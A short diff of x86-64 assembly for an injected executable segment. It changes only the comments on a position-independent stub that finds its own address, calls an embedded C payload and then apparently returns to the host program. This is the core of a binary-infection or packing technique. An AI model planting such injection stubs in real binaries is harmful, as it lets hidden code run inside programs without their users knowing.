@@ -8,14 +8,14 @@ injected SEGMENT READ EXECUTE
         ; int 3
         call _next  ; push rip; jmp _next
     _next:
-        pop rbp                                     ; rbp = rip
+        pop rbp     ; rbp = rip
         sub rbp, _next - payload
 
         mov rbx, [rbp + (to_c_code - payload)]
         add rbx, rbp
-        enter 1000h, 0
+        enter 1000h, 0  ; Reserve 0x1000 bytes on the stack for the C payload
         call rbx
-        leave
+        leave           ; Restore the stack
 
         mov rbx, [rbp + (delta_start - payload)]
         add rbx, rbp
